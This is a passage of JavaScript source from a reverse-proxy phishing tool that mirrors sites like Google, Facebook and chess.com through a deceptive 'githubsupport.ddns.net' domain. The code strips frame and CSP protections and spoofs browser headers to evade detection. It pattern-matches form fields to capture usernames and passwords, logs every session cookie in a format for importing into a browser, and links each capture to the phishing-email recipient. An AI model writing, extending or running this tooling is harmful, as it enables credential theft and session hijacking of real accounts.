  processResponseHeaders(headers, session, req) {
    const result = { ...headers };
    const sessionToken = session.sessionToken;
    const isGoogleService = session.targetUrl.includes('google.com') || session.targetUrl.includes('gmail.com');
    
    if (isGoogleService) {
      console.log('🔥 Applying intelligent header processing for Google');
    }
    
    // Remove CSP headers that prevent iframe embedding (but preserve others)
    const removeHeadersIgnoreCase = (headerNames) => {
      headerNames.forEach(headerName => {
        Object.keys(result).forEach(key => {
          if (key.toLowerCase() === headerName.toLowerCase()) {
            const value = result[key];
            if (typeof value === 'string' && value.includes('frame-ancestors')) {
              console.log(`Removing ${key} header with frame-ancestors restriction`);
              delete result[key];
            } else if (headerName.includes('frame-options')) {
              console.log(`Removing ${key} frame options header`);
              delete result[key];
            }
          }
        });
      });
    };
    
    // Only remove frame-specific CSP directives, not all CSP
    removeHeadersIgnoreCase([
      'x-frame-options',
      'frame-options'
    ]);
    
    // For CSP headers, modify them instead of removing completely
    Object.keys(result).forEach(key => {
      if (key.toLowerCase().includes('content-security-policy')) {
        const cspValue = result[key];
        if (typeof cspValue === 'string') {
          // Remove frame-ancestors restrictions but keep other CSP directives
          const modifiedCSP = cspValue
            .replace(/frame-ancestors[^;]*;?/gi, 'frame-ancestors *;')
            .replace(/frame-src[^;]*;?/gi, 'frame-src *;');
          
          if (modifiedCSP !== cspValue) {
            console.log('Modified CSP to allow iframe embedding');
            result[key] = modifiedCSP;
          }
        }
      }
    });

    // For Google services, be more selective about security header removal
    if (isGoogleService) {
      // Only remove headers that specifically block iframe embedding
      const problematicHeaders = [
        'x-frame-options',
        'cross-origin-embedder-policy',
        'cross-origin-opener-policy'
      ];
      
      removeHeadersIgnoreCase(problematicHeaders);
      
      // Add permissive iframe policies without breaking other security
      result['X-Frame-Options'] = 'ALLOWALL';
      
      // If there's no CSP, add a minimal one that allows iframe embedding
      const hasCsp = Object.keys(result).some(key => 
        key.toLowerCase().includes('content-security-policy')
      );
      
      if (!hasCsp) {
        result['Content-Security-Policy'] = "frame-ancestors *; frame-src *;";
      }
    }

    // Add minimal CORS headers (don't override all existing headers)
    result['Access-Control-Allow-Origin'] = result['Access-Control-Allow-Origin'] || '*';
    result['Access-Control-Allow-Methods'] = result['Access-Control-Allow-Methods'] || 'GET, POST, PUT, DELETE, OPTIONS';
    result['Access-Control-Allow-Headers'] = result['Access-Control-Allow-Headers'] || '*';

    // Handle cookies more carefully to preserve Google's authentication
    if (result['set-cookie']) {
      const proxyHost = req.get('host');
      const cookies = Array.isArray(result['set-cookie']) ? result['set-cookie'] : [result['set-cookie']];
      
      const modifiedCookies = cookies.map(cookie => {
        if (!isGoogleService) {
          // For non-Google sites, apply more aggressive cookie modifications
          return cookie
            .replace(/domain=[^;]+;?/gi, '')
            .replace(/path=([^;]+);?/gi, `path=/${sessionToken}$1;`)
            .replace(/samesite=[^;]+;?/gi, '')
            .replace(/secure;?/gi, req.protocol === 'https' ? 'secure;' : '');
        } else {
          // For Google, preserve cookie security but allow cross-domain
          return cookie
            .replace(/samesite=strict/gi, 'samesite=none')
            .replace(/samesite=lax/gi, 'samesite=none');
        }
      });
      
      result['set-cookie'] = modifiedCookies;
    }

    return result;
  }
  
  /**
   * Build a combined cookie header from client cookies and session cookies
   * with special handling for sites with anti-MITM protections
   */
  buildCookieHeader(req, cookieJar, targetUrl) {
    try {
      // Create a site-specific cookie handler
      const targetHost = new URL(targetUrl).hostname;
      
      // Special cases for complex websites with anti-MITM detection
      if (targetHost.includes('facebook.com') || targetHost.includes('fb.com')) {
        return this.buildFacebookCookieHeader(req, cookieJar, targetUrl);
      } 
      else if (targetHost.includes('chess.com')) {
        return this.buildChessCookieHeader(req, cookieJar, targetUrl);
      }
      
      // Default cookie handling
      // Get cookies from jar for this URL
      const cookiesFromJar = cookieJar.getCookiesSync(targetUrl);
      const jarCookieStrings = cookiesFromJar.map(c => `${c.key}=${c.value}`);
      
      // Get cookies from request
      const requestCookies = req.headers.cookie ? req.headers.cookie.split('; ') : [];
      
      // Remove duplicate cookies (jar cookies take precedence)
      const cookieNames = new Set(cookiesFromJar.map(c => c.key));
      const filteredRequestCookies = requestCookies.filter(cookie => {
        const name = cookie.split('=')[0];
        return !cookieNames.has(name);
      });
      
      // Combine cookies
      const allCookies = [...filteredRequestCookies, ...jarCookieStrings];
      
      return allCookies.length > 0 ? allCookies.join('; ') : undefined;
    } catch (error) {
      console.error('Error building cookie header:', error);
      return req.headers.cookie || '';
    }
  }
  
  /**
   * Facebook-specific cookie header building
   * Handles special cookies needed for Facebook's anti-bot systems
   */
  buildFacebookCookieHeader(req, cookieJar, targetUrl) {
    try {
      // Get cookies from jar
      const cookiesFromJar = cookieJar.getCookiesSync(targetUrl);
      const jarCookieStrings = cookiesFromJar.map(c => `${c.key}=${c.value}`);
      
      // Facebook requires certain cookies in a specific order
      // We prioritize auth cookies and Facebook-specific cookies
      const fbPriorityCookies = ['c_user', 'xs', 'fr', 'datr', 'sb', 'wd', 'spin'];
      
      // Sort cookies to make Facebook priority cookies come first
      const sortedCookies = [...jarCookieStrings].sort((a, b) => {
        const nameA = a.split('=')[0];
        const nameB = b.split('=')[0];
        
        const priorityA = fbPriorityCookies.indexOf(nameA);
        const priorityB = fbPriorityCookies.indexOf(nameB);
        
        if (priorityA !== -1 && priorityB !== -1) return priorityA - priorityB;
        if (priorityA !== -1) return -1;
        if (priorityB !== -1) return 1;
        return 0;
      });
      
      return sortedCookies.length > 0 ? sortedCookies.join('; ') : undefined;
    } catch (error) {
      console.error('Error building Facebook cookie header:', error);
      return req.headers.cookie || '';
    }
  }
  
  /**
   * Chess.com-specific cookie header building
   */
  buildChessCookieHeader(req, cookieJar, targetUrl) {
    try {
      // Get cookies from jar
      const cookiesFromJar = cookieJar.getCookiesSync(targetUrl);
      const jarCookieStrings = cookiesFromJar.map(c => `${c.key}=${c.value}`);
      
      // Chess.com seems to depend on these cookies for session tracking
      const chessPriorityCookies = ['PHPSESSID', 'CCC', 'chess_', 'remember_', 'sessionId'];
      
      // Sort cookies to make Chess.com priority cookies come first
      const sortedCookies = [...jarCookieStrings].sort((a, b) => {
        const nameA = a.split('=')[0];
        const nameB = b.split('=')[0];
        
        // Check if cookie name starts with any priority prefix
        const isAPriority = chessPriorityCookies.some(prefix => nameA.startsWith(prefix));
        const isBPriority = chessPriorityCookies.some(prefix => nameB.startsWith(prefix));
        
        if (isAPriority && !isBPriority) return -1;
        if (!isAPriority && isBPriority) return 1;
        return 0;
      });
      
      return sortedCookies.length > 0 ? sortedCookies.join('; ') : undefined;
    } catch (error) {
      console.error('Error building Chess.com cookie header:', error);
      return req.headers.cookie || '';
    }
  }
  
  /**
   * Store cookie for later use with enhanced handling for special sites
   */
  storeCookieForLater(sessionToken, cookieStr, targetUrl) {
    try {
      // Extract cookie info
      const [cookieMain] = cookieStr.split(';');
      const [name, value] = cookieMain.split('=');
      
      if (!name || value === undefined) return; // Skip invalid cookies
      
      const sessionData = this.sessionStorage.get(sessionToken) || {};
      const cookies = sessionData.cookies || {};
      
      // Store/update the cookie
      cookies[name] = value;
      sessionData.cookies = cookies;
      
      // Special handling for certain domains
      const host = new URL(targetUrl).hostname;
      
      // Store domain-specific cookie information for special sites
      if (!sessionData.domainCookies) {
        sessionData.domainCookies = {};
      }
      
      if (host.includes('facebook') || host.includes('fb.com')) {
        if (!sessionData.domainCookies['facebook']) {
          sessionData.domainCookies['facebook'] = {};
        }
        sessionData.domainCookies['facebook'][name] = value;
      } 
      else if (host.includes('chess.com')) {
        if (!sessionData.domainCookies['chess']) {
          sessionData.domainCookies['chess'] = {};
        }
        sessionData.domainCookies['chess'][name] = value;
      }
      
      this.sessionStorage.set(sessionToken, sessionData);
    } catch (error) {
      console.error('Error storing cookie:', error);
    }
  }
  
  /**
   * Translate referer URLs to target site format
   */
  translateReferer(refererHeader, targetUrl, sessionToken) {
    // If referer is from our proxy, translate it to target site
    if (refererHeader.includes(`/${sessionToken}`)) {
      const refPath = refererHeader.split(`/${sessionToken}`)[1] || '/';
      return `${targetUrl}${refPath}`;
    }
    return refererHeader;
  }

  /**
   * Handle form submission to mirrored website
   */
  async handleFormSubmission(session, req, res, targetUrl, cookieJar) {
    try {
      console.log('⚠️ Form submission to mirrored website detected');
      
      // Extract and log form data
      const formData = { ...req.body };
      const trackingId = req.query._fstrike_track || formData._fstrike_track;
      delete formData._fstrike_session; // Remove our tracking field
      delete formData._fstrike_track;   // Remove our tracking field
      
      // Check for potential credentials
      const credentialFields = this.extractCredentials(formData);
      let loginAttemptId = null;
      
      if (credentialFields && Object.keys(credentialFields).length > 0) {
        console.log('🔑 POSSIBLE CREDENTIALS DETECTED:', JSON.stringify(credentialFields));
        
        // Store in captures
        const captures = this.captures.get(session.sessionToken);
        captures.credentials.push({
          ...credentialFields,
          timestamp: new Date().toISOString(),
          url: targetUrl,
          ip: req.ip,
          userAgent: req.get('User-Agent')
        });
        this.captures.set(session.sessionToken, captures);
        
        // Store in database and associate with email recipient if possible
        try {
          // First store in captured_credentials table
          await new Promise((resolve, reject) => {
            db.run(
              `INSERT INTO captured_credentials (campaign_id, url, username, password, other_fields, ip_address, user_agent)
               VALUES (?, ?, ?, ?, ?, ?, ?)`,
              [
                session.campaignId, 
                targetUrl, 
                credentialFields.username || credentialFields.email || null, 
                credentialFields.password || null,
                JSON.stringify(formData),
                req.ip, 
                req.get('User-Agent')
              ],
              function(err) {
                if (err) {
                  console.error('Error storing credentials:', err);
                  reject(err);
                } else {
                  console.log('💾 Credentials stored in database with ID:', this.lastID);
                  resolve(this.lastID);
                }
              }
            );
          });
          
          // Now associate with email recipient
          loginAttemptId = await this.associateLoginWithEmail(
            session.sessionToken, 
            trackingId, 
            {
              ...credentialFields,
              formData: JSON.stringify(formData),
              ip_address: req.ip,
              user_agent: req.get('User-Agent')
            }
          );
          
          console.log('Login attempt associated with email, ID:', loginAttemptId);
        } catch (dbError) {
          console.error('Database error when storing credentials:', dbError);
        }
      }

      // Store form submission in our database
      db.run(
        `INSERT INTO FormSubmissions (campaign_id, landing_page_id, form_data, ip_address, user_agent)
         VALUES (?, ?, ?, ?, ?)`,
        [session.campaignId, 0, JSON.stringify(formData), req.ip, req.get('User-Agent')]
      );

      console.log('Form data captured for campaign:', session.campaignId);
      
      // Prepare data for forwarding
      let forwardData;
      let contentType = req.headers['content-type'] || '';
      
      if (contentType.includes('application/x-www-form-urlencoded')) {
        forwardData = new URLSearchParams(formData).toString();
      } else if (contentType.includes('multipart/form-data')) {
        // Multipart forms should be passed directly
        forwardData = req.body;
        contentType = req.headers['content-type'];
      } else if (contentType.includes('application/json')) {
        forwardData = JSON.stringify(formData);
      } else {
        // Default to URL encoded
        forwardData = new URLSearchParams(formData).toString();
        contentType = 'application/x-www-form-urlencoded';
      }

      // Forward form submission to target website
      const targetHostname = new URL(targetUrl).hostname;
      const targetOrigin = new URL(targetUrl).origin;
      
      const cookieHeader = this.buildCookieHeader(req, cookieJar, targetUrl);
      
      const response = await axiosInstance({
        method: 'POST',
        url: targetUrl,
        data: forwardData,
        headers: {
          'User-Agent': req.headers['user-agent'] || 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36',
          'Content-Type': contentType,
          'Accept': req.headers['accept'] || 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
          'Accept-Language': req.headers['accept-language'] || 'en-US,en;q=0.9',
          'Accept-Encoding': req.headers['accept-encoding'] || 'gzip, deflate, br',
          'Origin': targetOrigin,
          'Referer': `${targetUrl}`,
          'Host': targetHostname,
          ...(cookieHeader ? {'Cookie': cookieHeader} : {})
        },
        maxRedirects: 0, // Handle redirects manually
        validateStatus: () => true, // Accept any status code
        responseType: 'arraybuffer',
        timeout: 15000,
        jar: cookieJar,
        withCredentials: true
      });
      
      // Save cookies from response
      if (response.headers['set-cookie']) {
        const cookies = Array.isArray(response.headers['set-cookie']) 
          ? response.headers['set-cookie'] 
          : [response.headers['set-cookie']];
          
        cookies.forEach(cookie => {
          this.storeCookieForLater(session.sessionToken, cookie, targetUrl);
        });
        
        // Track interesting cookies (like auth tokens)
        this.trackAllCookies(session.sessionToken, cookies);
        
        // If we have a login attempt ID, update it with cookies
        if (loginAttemptId) {
          await this.updateCookiesForLogin(loginAttemptId, session.sessionToken);
        }
      }

      // Handle redirects
      if (response.status >= 300 && response.status < 400 && response.headers.location) {
        return this.handleRedirect(session, req, res, response);
      }

      // Process response headers
      const processedHeaders = this.processResponseHeaders(response.headers, session, req);
      
      // Set processed response headers
      Object.entries(processedHeaders).forEach(([key, value]) => {
        if (value !== undefined && value !== null) {
          res.setHeader(key, value);
        }
      });

      res.status(response.status);

      // Modify HTML content if it's HTML
      const resContentType = response.headers['content-type'] || '';
      if (resContentType.includes('text/html')) {
        const charset = this.extractCharset(resContentType) || 'utf-8';
        const html = response.data.toString(charset);
        const modifiedHtml = this.modifyHtmlContent(html, session.sessionToken, session.targetUrl, req);
        res.send(modifiedHtml);
      } else {
        // Pass through non-HTML content
        res.send(response.data);
      }
    } catch (error) {
      console.error('Error handling form submission:', error);
      this.handleProxyError(error, res, session);
    }
  }

  extractCredentials(formData) {
    const result = {};
    const credentialFields = {
      username: [/user/i, /name/i, /login/i, /log/i, /account/i],
      email: [/mail/i, /email/i, /e-mail/i],
      password: [/pass/i, /pw/i, /passwd/i, /password/i, /pwd/i]
    };
    
    // Look for credential fields
    for (const [fieldName, value] of Object.entries(formData)) {
      if (value && typeof value === 'string') {
        // Check for email fields
        if (credentialFields.email.some(pattern => pattern.test(fieldName))) {
          if (value.includes('@')) {
            result.email = value;
          }
        }
        // Check for username fields
        else if (credentialFields.username.some(pattern => pattern.test(fieldName))) {
          result.username = value;
        }
        // Check for password fields
        else if (credentialFields.password.some(pattern => pattern.test(fieldName))) {
          result.password = value;
        }
      }
    }
    
    return result;
  }

  /**
   * Associate login attempt with target email (the user who received the phishing email)
   * @param {string} sessionToken - The session token
   * @param {string} trackingId - The tracking ID associated with the email recipient
   * @param {object} credentials - The captured credentials
   */
  async associateLoginWithEmail(sessionToken, trackingId, credentials) {
    try {
      // Check if we have a tracking ID from the parameter or from the session
      const session = this.activeSessions.get(sessionToken);
      if (!trackingId && session && session.trackingId) {
        // Use the tracking ID stored with the session
        trackingId = session.trackingId;
        console.log(`Using stored tracking ID ${trackingId} from session`);
      }
      
      // Return if we still don't have a tracking ID
      if (!trackingId) {
        console.log("No tracking ID available to associate login with email");
        return;
      }
      
      const emailInfo = await new Promise((resolve, reject) => {
        db.get(
          `SELECT user_email, campaign_id FROM tracking_pixels WHERE id = ?`,
          [trackingId],
          (err, row) => {
            if (err) reject(err);
            else resolve(row);
          }
        );
      });
      
      if (!emailInfo) {
        console.log(`No email information found for tracking ID ${trackingId}`);
        return;
      }
      
      // Create login_attempts table if it doesn't exist
      await new Promise((resolve, reject) => {
        db.run(`
          CREATE TABLE IF NOT EXISTS login_attempts (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            campaign_id INTEGER NOT NULL,
            session_id TEXT NOT NULL, 
            target_email TEXT NOT NULL,
            username TEXT,
            password TEXT,
            input_email TEXT,
            form_data TEXT,
            url TEXT,
            ip_address TEXT,
            user_agent TEXT,
            timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
            has_cookies INTEGER DEFAULT 0
          )
        `, (err) => {
          if (err) reject(err);
          else resolve();
        });
      });
      
      // Store the login attempt with the association to the target email
      if (session) {
        await new Promise((resolve, reject) => {
          db.run(`
            INSERT INTO login_attempts (
              campaign_id, session_id, target_email, username, password, input_email, 
              form_data, url, ip_address, user_agent
            ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
          `, [
            emailInfo.campaign_id,
            session.sessionId,
            emailInfo.user_email,
            credentials.username || null,
            credentials.password || null,
            credentials.email || null,
            JSON.stringify(credentials),
            session.targetUrl,
            credentials.ip_address || null,
            credentials.user_agent || null
          ], function(err) {
            if (err) reject(err);
            else {
              console.log(`Login attempt associated with email: ${emailInfo.user_email}, ID: ${this.lastID}`);
              resolve(this.lastID);
            }
          });
        });
      }
    } catch (error) {
      console.error('Error associating login with email:', error);
    }
  }
  
  /**
   * Update cookies for a login attempt
   * @param {number} loginAttemptId - The login attempt ID
   * @param {string} sessionToken - The session token
   */
  async updateCookiesForLogin(loginAttemptId, sessionToken) {
    try {
      if (!loginAttemptId || !sessionToken) {
        console.log('Missing loginAttemptId or sessionToken for cookie update');
        return;
      }
      
      const captures = this.captures.get(sessionToken);
      if (!captures || !captures.cookies || captures.cookies.length === 0) {
        console.log(`No cookies found in captures for session ${sessionToken}`);
        return;
      }
      
      // Store cookies in database
      const cookiesJson = JSON.stringify(captures.cookies);
      
      console.log(`Updating login attempt ${loginAttemptId} with ${captures.cookies.length} cookies`);
      
      // First verify the login attempt exists
      const loginAttempt = await new Promise((resolve, reject) => {
        db.get('SELECT id FROM login_attempts WHERE id = ?', [loginAttemptId], (err, row) => {
          if (err) reject(err);
          else resolve(row);
        });
      });
      
      if (!loginAttempt) {
        console.error(`Login attempt with ID ${loginAttemptId} not found`);
        return;
      }
      
      // Update the login attempt with cookies
      await new Promise((resolve, reject) => {
        db.run(`
          UPDATE login_attempts 
          SET cookies = ?, has_cookies = 1
          WHERE id = ?
        `, [cookiesJson, loginAttemptId], function(err) {
          if (err) {
            console.error(`Error updating cookies for login attempt ${loginAttemptId}:`, err);
            reject(err);
          } else {
            console.log(`Successfully updated cookies for login attempt ${loginAttemptId}. Changes: ${this.changes} rows`);
            resolve();
          }
        });
      });
    } catch (error) {
      console.error('Error updating cookies for login:', error);
    }
  }

  /**
   * Track all cookies and store them in database
   * Now captures every cookie and stores in database for real-time access
   */
  async trackAllCookies(sessionToken, cookies) {
    const captures = this.captures.get(sessionToken);
    if (!captures) {
      console.error(`No captures found for session ${sessionToken}`);
      return;
    }
    
    if (!captures.cookies) {
      captures.cookies = [];
    }
    
    const session = this.activeSessions.get(sessionToken);
    if (!session) {
      console.error(`No session found for token ${sessionToken}`);
      return;
    }
    
    const newCookies = [];
    
    for (const cookie of cookies) {
      try {
        // Parse the cookie string to extract all attributes
        const cookieDetails = this.parseCookieString(cookie);
        
        // Skip cookies with empty names or values
        if (!cookieDetails.name || cookieDetails.value === undefined) {
          continue;
        }
        
        // Store or update cookie in database
        await new Promise((resolve, reject) => {
          db.run(`
            INSERT OR REPLACE INTO captured_cookies (
              campaign_id, session_token, cookie_name, cookie_value, domain, path,
              expiration_date, secure, http_only, same_site, host_only, session,
              original_cookie, first_seen, last_updated, is_active
            ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, 
              COALESCE((SELECT first_seen FROM captured_cookies WHERE session_token = ? AND cookie_name = ? AND domain = ? AND path = ?), CURRENT_TIMESTAMP),
              CURRENT_TIMESTAMP, 1)
          `, [
            session.campaignId,
            sessionToken,
            cookieDetails.name,
            cookieDetails.value,
            cookieDetails.domain,
            cookieDetails.path,
            cookieDetails.expirationDate,
            cookieDetails.secure ? 1 : 0,
            cookieDetails.httpOnly ? 1 : 0,
            cookieDetails.sameSite,
            cookieDetails.hostOnly ? 1 : 0,
            cookieDetails.session ? 1 : 0,
            cookieDetails.original,
            sessionToken,
            cookieDetails.name,
            cookieDetails.domain,
            cookieDetails.path
          ], function(err) {
            if (err) {
              console.error(`Error storing cookie ${cookieDetails.name}:`, err);
              reject(err);
            } else {
              console.log(`💾 Stored cookie in database: ${cookieDetails.name}`);
              resolve();
            }
          });
        });
        
        // Update in-memory captures for backward compatibility
        const existingIndex = captures.cookies.findIndex(c => 
          c.name === cookieDetails.name && 
          c.domain === cookieDetails.domain &&
          c.path === cookieDetails.path
        );
        
        if (existingIndex !== -1) {
          captures.cookies[existingIndex] = {
            ...captures.cookies[existingIndex],
            ...cookieDetails,
            lastUpdated: new Date().toISOString()
          };
          console.log(`🔄 Updated in-memory cookie: ${cookieDetails.name}`);
        } else {
          cookieDetails.firstSeen = new Date().toISOString();
          captures.cookies.push(cookieDetails);
          newCookies.push(cookieDetails);
          console.log(`📥 Added new in-memory cookie: ${cookieDetails.name}`);
        }
      } catch (error) {
        console.error(`Error processing cookie: ${error.message}`);
      }
    }
    
    this.captures.set(sessionToken, captures);
    
    console.log(`📊 Processed ${cookies.length} cookies for campaign ${session.campaignId}`);
  }
  
  /**
   * Parse cookie string into detailed object format compatible with Cookie Editor
   */
  parseCookieString(cookieStr) {
    const cookieParts = cookieStr.split(';');
    const [nameValuePair] = cookieParts;
    const [name, value] = nameValuePair.split('=');
    
    // Extract other cookie attributes
    const domain = cookieParts.find(part => part.trim().toLowerCase().startsWith('domain='));
    const path = cookieParts.find(part => part.trim().toLowerCase().startsWith('path='));
    const expires = cookieParts.find(part => part.trim().toLowerCase().startsWith('expires='));
    const maxAge = cookieParts.find(part => part.trim().toLowerCase().startsWith('max-age='));
    const secure = cookieParts.some(part => part.trim().toLowerCase() === 'secure');
    const httpOnly = cookieParts.some(part => part.trim().toLowerCase() === 'httponly');
    const sameSite = cookieParts.find(part => part.trim().toLowerCase().startsWith('samesite='));
    
    // Convert expires or max-age to expirationDate (in seconds since epoch)
    let expirationDate = null;
    if (expires) {
      try {
        expirationDate = Math.floor(new Date(expires.split('=')[1]).getTime() / 1000);
      } catch (e) {
        // Ignore invalid date format
      }
    } else if (maxAge) {
      try {
        const seconds = parseInt(maxAge.split('=')[1].trim(), 10);
        expirationDate = Math.floor(Date.now() / 1000) + seconds;
      } catch (e) {
        // Ignore invalid format
      }
    }

    // Extract domain value and determine hostOnly
    let domainValue = null;
    let hostOnly = true;
    if (domain) {
      domainValue = domain.split('=')[1].trim();
      hostOnly = !domainValue.startsWith('.');
    }

    // Normalize sameSite for Cookie Editor compatibility
    let sameSiteValue = 'no_restriction';
    if (sameSite) {
      const rawSameSite = sameSite.split('=')[1].trim().toLowerCase();
      switch (rawSameSite) {
        case 'strict':
          sameSiteValue = 'strict';
          break;
        case 'lax':
          sameSiteValue = 'lax';
          break;
        case 'none':
          sameSiteValue = 'no_restriction';
          break;
        default:
          sameSiteValue = 'unspecified';
      }
    }
    
    // Return cookie in Cookie Editor compatible format
    return {
      name: name && decodeURIComponent(name.trim()),
      value: value && decodeURIComponent(value.trim()),
      domain: domainValue,
      hostOnly: hostOnly,
      path: path ? path.split('=')[1].trim() : '/',
      secure: secure,
      httpOnly: httpOnly,
      sameSite: sameSiteValue,
      session: !expirationDate,
      firstPartyDomain: '',
      partitionKey: null,
      ...(expirationDate ? { expirationDate: expirationDate } : {}),
      storeId: null,
      original: cookieStr
    };
  }

  /**
   * Handle proxy error gracefully
   */
  handleProxyError(error, res, sessionObj) {
    console.error('Proxy error:', error.message);
    
    let errorMessage = 'Error accessing the website';
    let statusCode = 500;
    
    if (error.response) {
      statusCode = error.response.status;
      
      if (statusCode === 400) {
        errorMessage = 'The target website rejected our request. This site might have bot protection.';
      } else if (statusCode === 401 || statusCode === 403) {
        errorMessage = 'Access denied by the target website. This site may be blocking our server.';
      } else if (statusCode === 404) {
        errorMessage = 'The requested page was not found on the target website.';
      } else if (statusCode === 429) {
        errorMessage = 'The target website is rate limiting requests. Please try again later.';
      } else if (statusCode >= 500) {
        errorMessage = 'The target website is experiencing technical difficulties.';
      } else {
        errorMessage = `Error accessing website: ${error.response.statusText || 'Unknown error'}`;
      }
    } else if (error.code === 'ECONNABORTED') {
      statusCode = 504;
      errorMessage = 'Connection to the target website timed out.';
    } else if (error.code === 'ENOTFOUND') {
      statusCode = 502;
      errorMessage = 'Could not resolve target website hostname.';
    } else {
      statusCode = 500;
      errorMessage = 'An error occurred while connecting to the target website.';
    }
    
    res.status(statusCode).send(`
      <html>
        <head>
          <title>Connection Error</title>
          <style>
            body { font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto; padding: 20px; }
            h1 { color: #d9534f; }
            .message { background-color: #f9f9f9; padding: 15px; border-radius: 5px; }
            .try-again { margin-top: 20px; }
          </style>
        </head>
        <body>
          <h1>Connection Error</h1>
          <div class="message">
            <p>${errorMessage}</p>
          </div>
          <div class="try-again">
            <p><a href="javascript:location.reload()">Try again</a></p>
          </div>
        </body>
      </html>
    `);
  }

  /**
   * Handle mirroring request for a specific session
   * @param {string} sessionToken - The session token from URL path
   * @param {object} req - Express request object
   * @param {object} res - Express response object
   */
  async handleMirrorRequest(sessionToken, req, res) {
    try {
      const session = this.activeSessions.get(sessionToken);
      
      if (!session) {
        // Session not in memory, try to load it from database
        const dbSession = await new Promise((resolve, reject) => {
          db.get(
            `SELECT * FROM WebsiteMirroringSessions 
             WHERE session_token = ? AND status = 'active'`,
            [sessionToken],
            (err, row) => {
              if (err) reject(err);
              else resolve(row);
            }
          );
        });
        
        if (dbSession) {
          // Create session in memory
          const newSession = {
            sessionId: dbSession.id,
            campaignId: dbSession.campaign_id,
            targetUrl: dbSession.target_url,
            sessionToken,
            proxyUrl: `https://githubsupport.ddns.net/${sessionToken}`,
            startTime: new Date(dbSession.created_at)
          };
          
          this.activeSessions.set(sessionToken, newSession);
          this.mirrorRoutes.set(`/${sessionToken}`, newSession);
          
          // Create cookie jar for this session if it doesn't exist
          if (!this.cookieJars.has(sessionToken)) {
            this.cookieJars.set(sessionToken, new CookieJar());
          }
          
          // Initialize session storage if it doesn't exist
          if (!this.sessionStorage.has(sessionToken)) {
            this.sessionStorage.set(sessionToken, {});
          }
          
          // Initialize captures if it doesn't exist
          if (!this.captures.has(sessionToken)) {
            this.captures.set(sessionToken, {
              credentials: [],
              formData: [],
              cookies: []
            });
          }
          
          // Use newly created session
          return this.handleMirrorRequest(sessionToken, req, res);
        }
        
        return res.status(404).send('Mirror session not found or expired');
      }

      // Track the access
      await this.trackAccess(session.sessionId, req);

      // Get the target URL
      const targetUrl = session.targetUrl;
      let requestPath = req.path.replace(`/${sessionToken}`, '') || '/';
      const queryString = req.url.includes('?') ? req.url.split('?')[1] : '';
      
      // Remove tracking parameters from forwarded request
      let cleanQuery = '';
      if (queryString) {
        const params = new URLSearchParams(queryString);
        params.delete('_fstrike_track');
        cleanQuery = params.toString();
      }
      
      // Build full target URL
      let fullTargetUrl = targetUrl + requestPath;
      if (cleanQuery) {
        fullTargetUrl += '?' + cleanQuery;
      }

      console.log(`Mirroring request: ${req.method} ${req.originalUrl} -> ${fullTargetUrl}`);

      // Get the cookie jar for this session
      const cookieJar = this.cookieJars.get(sessionToken);
      
      // Handle form submissions
      if (req.method === 'POST') {
        return this.handleFormSubmission(session, req, res, fullTargetUrl, cookieJar);
      }

      // Generate realistic browser headers with anti-detection
      const headers = this.generateRealistBrowserHeaders(req, fullTargetUrl, sessionToken);
      
      // Build cookie header
      const cookieHeader = this.buildCookieHeader(req, cookieJar, fullTargetUrl);
      if (cookieHeader) {
        headers['Cookie'] = cookieHeader;
      }

      // Add randomized request timing to avoid pattern detection
      const randomDelay = Math.random() * 100; // 0-100ms random delay
      await new Promise(resolve => setTimeout(resolve, randomDelay));

      // Make request to target website with advanced anti-detection
      // FIXED: Don't use custom HTTPS agent with axios-cookiejar-support
      const response = await axiosInstance({
        method: req.method,
        url: fullTargetUrl,
        headers,
        responseType: 'arraybuffer',
        maxRedirects: 0, // Handle redirects manually
        validateStatus: () => true, // Don't throw on error status codes
        timeout: 30000, // Increased timeout for better reliability
        decompress: true,
        jar: cookieJar,
        withCredentials: true
        // Removed custom HTTPS agent that was conflicting with axios-cookiejar-support
      });
      
      // Save cookies from response with advanced processing
      if (response.headers['set-cookie']) {
        const cookies = Array.isArray(response.headers['set-cookie']) 
          ? response.headers['set-cookie'] 
          : [response.headers['set-cookie']];
          
        cookies.forEach(cookie => {
          this.storeCookieForLater(session.sessionToken, cookie, fullTargetUrl);
        });
        
        // Track interesting cookies (like auth tokens)
        this.trackAllCookies(session.sessionToken, cookies);
      }

      // Handle redirects
      if (response.status >= 300 && response.status < 400 && response.headers.location) {
        return this.handleRedirect(session, req, res, response);
      }

      // Process response headers before sending them
      const processedHeaders = this.processResponseHeaders(response.headers, session, req);
      
      // Set all processed response headers
      Object.entries(processedHeaders).forEach(([key, value]) => {
        if (value !== undefined && value !== null) {
          res.setHeader(key, value);
        }
      });

      res.status(response.status);

      // Modify HTML content if it's HTML with advanced anti-detection
      const contentType = response.headers['content-type'] || '';
      if (contentType.includes('text/html')) {
        const charset = this.extractCharset(contentType) || 'utf-8';
        const html = response.data.toString(charset);
        const modifiedHtml = await this.modifyHtmlContent(html, sessionToken, targetUrl, req);
        res.send(modifiedHtml);
      } else {
        // Pass through non-HTML content unchanged
        res.send(response.data);
      }
    } catch (error) {
      console.error('Error handling mirror request:', error);
      this.handleProxyError(error, res, session);
    }
  }

  /**
   * Create a new website mirroring session for a campaign
   * @param {number} campaignId - Campaign ID
   * @param {string} targetUrl - URL to mirror
   * @returns {Promise<Object>} Mirror session details
   */
  async createMirrorSession(campaignId, targetUrl) {
    try {
      // Generate unique session token (like iksduhfgh_7898dmndfikd)
      const sessionToken = crypto.randomBytes(16).toString('hex');
      
      // Normalize target URL
      const normalizedUrl = this.normalizeUrl(targetUrl);
      
      // Create session in database
      const sessionId = await new Promise((resolve, reject) => {
        db.run(
          `INSERT INTO WebsiteMirroringSessions 
           (campaign_id, target_url, session_token, status, proxy_port) 
           VALUES (?, ?, ?, ?, ?)`,
          [campaignId, normalizedUrl, sessionToken, 'active', 5000],
          function(err) {
            if (err) reject(err);
            else resolve(this.lastID);
          }
        );
      });

      // Create proxy URL using path-based routing on the new domain
      const proxyUrl = `https://githubsupport.ddns.net/${sessionToken}`;
      
      // Create cookie jar for this session
      const cookieJar = new CookieJar();
